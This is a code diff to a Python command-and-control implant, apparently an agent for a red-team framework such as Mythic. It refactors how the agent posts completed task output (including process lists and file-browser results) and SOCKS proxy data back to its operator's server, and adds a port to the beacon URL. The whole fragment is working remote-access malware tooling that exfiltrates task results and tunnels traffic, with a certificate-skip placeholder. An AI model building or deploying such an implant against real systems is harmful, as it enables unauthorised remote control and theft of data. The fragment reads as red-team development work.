@@ -36,13 +36,15 @@ CRYPTO_HERE
 
     def postResponses(self):
         try:
-            responses = socks = []
+            responses = []
+            socks = []
             taskings = self.taskings
             for task in taskings:
                 if task["completed"] == True:
                     out = { "task_id": task["task_id"], "user_output": task["result"], "completed": True }
                     if task["error"]: out["status"] = "error"
-                    elif "file_browser" in task["parameters"]: out["file_browser"] = task["file_browser"]
+                    for func in ["processes", "file_browser"]: 
+                        if func in task: out[func] = task[func]
                     responses.append(out)
             while not self.socks_out.empty(): socks.append(self.socks_out.get())
             if ((len(responses) > 0) or (len(socks) > 0)):
@@ -72,10 +74,12 @@ CRYPTO_HERE
                 task["result"] = output
                 task["completed"] = True
             else:
-                task["error"] = task["completed"] = True
+                task["error"] = True
+                task["completed"] = True
                 task["result"] = "Function unavailable."
         except Exception as error:
-            task["error"] = task["completed"] = True
+            task["error"] = True
+            task["completed"] = True
             task["result"] = error
 
     def processTaskings(self):
@@ -132,9 +136,9 @@ CRYPTO_HERE
         for header in self.agent_config["Headers"]:
             hdrs[header["name"]] = header["value"]
         if method == 'GET':
-            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["GetURI"] + "?" + self.agent_config["GetURI"] + "=" + data.decode(), None, hdrs)
         else:
-            req = urllib.request.Request(self.agent_config["Server"] + self.agent_config["PostURI"], data, hdrs)
+            req = urllib.request.Request(self.agent_config["Server"] + ":" + self.agent_config["Port"] + self.agent_config["PostURI"], data, hdrs)
         #CERTSKIP
         if self.agent_config["ProxyHost"] and self.agent_config["ProxyPort"]:
             tls = "https" if self.agent_config["ProxyHost"][0:5] == "https" else "http"
